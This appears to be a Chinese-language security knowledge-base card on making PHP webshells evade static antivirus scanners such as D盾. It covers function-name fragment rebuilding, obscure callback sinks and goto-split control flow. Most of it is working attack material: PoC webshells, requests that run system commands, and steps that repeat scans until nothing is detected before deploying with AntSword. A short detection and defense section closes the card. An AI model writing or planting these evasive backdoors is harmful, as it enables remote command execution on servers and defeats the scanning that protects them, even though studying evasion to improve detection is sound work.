---
id: web-php-rce-webshell-name-rebuild-callback-goto-multilayer
title: PHP WebShell 多层免杀：函数名分片重建 + 冷门回调 sink + goto/自定义函数拆分控制流绕过静态正则
type: scenario
domain: web
path: web/php/rce
technique: php-webshell-name-rebuild-callback-goto-multilayer
aliases:
- webshell 免杀
- 函数名分片重建
- 冷门回调 sink
- goto 状态机免杀
- D 盾 绕过
tags:
- php
- webshell
- av-bypass
- obfuscation
- callback
- goto
- dynamic-call
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W2
  verified_at: '2026-11-08T11:55:25+08:00'
  notes: 已对照原文核对：函数名分片（substr/strtr/substr_replace/异或/base64/str_rot13）、冷门回调 sink（array_uintersect_assoc/call_user_func/array_map）、自定义函数分层与 goto 标签版本、D 盾/在线查杀截图结论均与原文一致；已修正 goto 版 PoC 注释（aXBjb25maWc= 解码为 ipconfig）；原文未标注受影响版本，属技法卡不设 affected_versions；未复跑 payload
---

## 一句话结论

后门查杀主要是正则/关键字匹配，所以免杀不是“藏代码”而是“不出现任何完整特征词”：把 `assert`/`system` 这类 sink 名拆成 `substr`/`strtr`/`substr_replace`/`base64_decode`/`str_rot13`/`^` 异或拼出来，把调用点换成冷门数组函数的 **callback 形参**（`array_uintersect_assoc`、`array_map`、`call_user_func`），再用自定义函数层层包裹 + `goto` 打乱控制流，静态扫描既看不到 sink 名也看不到 `eval/assert` 结构。

## 原理

- **检测模型是“字面匹配”**：D 盾/河马一类工具用正则匹配 `eval`、`assert`、`$_POST`、`system(` 等组合，以及对“变量函数直接调用外部输入”的启发式。绕过思路是让文件里不存在这些**完整**字符串，也不存在“请求参数直接当函数名”的典型形态。
- **函数名分片重建**：`substr('aa',1).'s'.'s'.'e'.'r'.'t'` → `assert`；`strtr('abcdet','bcde','sser')` → `assert`；`substr_replace("asaaaa","sert",2)` → `assert`；`('!'^'@').'ssert'` → `assert`；`base64_decode($_POST['x'])`/`str_rot13($_POST['x'])` 让**函数名本身来自解码后的参数**。分片后每个片段都是无害字符/无害函数调用，正则无法命中。
- **回调形参即 sink**：`array_uintersect_assoc(array($B), array(1), 'assert')` 在求交集时把成对元素交给比较器 `assert`，等价于 `assert($B)`；`call_user_func('assert', $_POST['x'])`、`array_map($_REQUEST['a'], array($_POST['x']))` 同理。检测规则往往盯 `assert(`/`system(` 字面，不盯“哪些内置函数的形参是 callable”。
- **变量覆盖再降一级**：`$b='_'.'P'.'O'.'S'.'T'; $c=$$b;` 让 `$_POST` 的名字也由拼接得到，`$x($c['x'])` 的形态对“变量函数 + 超全局变量”的启发式同样不典型。
- **控制流拆分**：把取值、解码、调用分散到不同函数（`post()` → `ey()` → `out()` → `run()`）甚至用 `goto` 在 `test1/test2/test3` 标签间跳转，让“输入→sink”的数据流在源码层面不连续；沙箱/正则扫描器看到的是一串无害函数调用。
- **为什么最终仍能执行**：PHP 运行时对“变量函数 + 变量参数”不做静态约束，`$x = 'assert'; $x($code)` 就是动态调用；只要分片在运行时拼成合法名，行为与明文写 `assert($code)` 完全一致。
- **边界（版本相关）**：PHP 8 起 `assert()` 不再接受字符串作为代码执行，需要把 sink 换成 `system`/`passthru`/`shell_exec` 或 `create_function` 的替代；同时 `assert` 在 PHP 7 之前才默认宽松。原文测试环境同时覆盖 PHP 5.6.9 与 7.3.4，属教学靶场。

## 触发条件

- 目标 PHP 版本存在可用的字符串执行 sink（`assert` 字符串模式在 PHP < 8；或改 `system`/`passthru`/`eval` 变体）。
- 文件可以落地并被 PHP 解析（上传、包含、写文件）。
- 免杀目标是**静态文件扫描/正则规则**；对内存行为、流量检测、RASP 无效（`assert`/`system` 调用在运行时仍可见）。
- 请求参数可控（`$_POST`/`$_GET`/`$_REQUEST`）。

## 利用步骤

1. 先写最朴素形态确认可用：`<?php assert($_POST['x']); ?>`，用 `x=phpinfo();` 验证。
2. 分片重建函数名，逐档加混淆：
   - `$x=substr('aa',1).'ssert'; $x($_POST['x']);`
   - `$x=strtr('abcdet','bcde','sser'); $x($_POST['x']);`
   - `$x=('!'^'@').'ssert'; $a=base64_decode($_POST['x']); $x($a);`
3. 换调用点：`array_uintersect_assoc(array($_POST['x']), array(1), 'assert')`；`call_user_func('assert', $_POST['x'])`；`array_map($_REQUEST['a'], array($_POST['x']))`。
4. 再包一层自定义函数并打散控制流（`post()` 取参解码 → `ey()` 拼名调用 → `out()` 透传 → `run()` 串起），或写成 `goto test1/test2/test3` 的标签跳转版本。
5. 用 `x=phpinfo();`（或 `x=system('id');`）验证执行；对同一份文件反复用本地扫描器（D 盾/火绒）对比检出等级，直到“无检出”。
6. 上线形态：文件里只留 `?x=<base64 payload>` 的调用约定，payload 由蚁剑/Burp 按同一编码投递。

## PoC

```php
<?php
// 函数名分片 + 冷门回调 sink + 自定义函数分层（PHP < 8 的 assert 字符串模式）
function post() { return base64_decode($_POST['x']); }
function ey($a)  { $x = ('!'^'@').'ssert'; return $x($a); }
function out($b) { return $b; }
function run()   { return out(ey(out(post()))); }
run();
```

```text
# 请求：x 存放 base64("phpinfo();")
POST /shell.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

x=cGhwaW5mbygpOw==
```

```php
<?php
// goto 状态机变体：取值/解码/调用被标签打断，源码中不出现连续的输入→sink
goto test1;
test1: $l = base64_decode($_GET['x'], true); if ($l === false) goto error; goto test2;
test2: if ($_GET['m'] === null) { print('NO'); } else { call_user_func($_GET['m'], $l); } goto test3;
test3: goto test1;
error: echo 'Error'; exit;
```

```text
?x=aXBjb25maWc=&m=system      # aXBjb25maWc= base64 解码为 ipconfig，即执行 ipconfig
```

## 变体与关联

- 变体：`create_function` 类构造（PHP < 8）+ 类 `__destruct` 里触发回调（`class B { public function __destruct() { array_uintersect_assoc(array($this->x), array(1), 'assert'); } }`），把 sink 藏进魔术方法，文件里既无顶层调用也无明文函数名。
- 变体：`$$` 变量覆盖取超全局（`$b='_'.'P'.'O'.'S'.'T'; $c=$$b;`），配合 `array_map($_REQUEST['a'], ...)` 让“函数名来自参数”也不呈典型形态。
- 变体：把上述组合再套一层 `str_rot13`/`base64` 的参数编码，形成双层解码。
- 关联：[[web-php-rce-webshell-obscure-callback-uintersect]]（单点讲“冷门回调形参作 sink”）、[[web-php-rce-webshell-string-not-dynamic-call-av-bypass]]（取反拼接 + 变量变量）、[[web-php-rce-webshell-xor-encoded-function-name]]（异或编码函数名）、[[web-php-rce-no-alnum-self-increment-variable-function]]（自增构造无字母数字函数名）。

## 检测与防御

- 检测（静态）：除关键字外，重点匹配“动态函数调用形态”——`$var(...)`、`$var[$k](...)`、`call_user_func*`、`array_*` 的第三/第二参数为字符串、`$_(POST|GET|REQUEST)` 出现在这些位置；以及 `substr|strtr|substr_replace|str_rot13|base64_decode|^` 与函数名字符的组合。
- 检测（动态）：PHP-FPM 层 hook `assert`/`system`/`passthru`/`call_user_func`；RASP 监控“变量函数调用且参数源自请求”；网络侧看蚁剑/冰蝎流量特征。
- 防御：上传目录禁止 PHP 解析、写权限与执行权限分离（Web 目录只读 + 独立上传目录）；`disable_functions` 覆盖 `assert`（PHP 8 已默认不安全语义）、`system`、`passthru`、`shell_exec`、`proc_open`、`create_function`；启用 opcache 完整性校验与文件完整性监控（HMAC/基线比对）。
- 边界：本卡只对抗静态正则，对 RASP/内存行为检测无效；PHP 8 下 `assert` 字符串模式失效，需按环境换 sink。
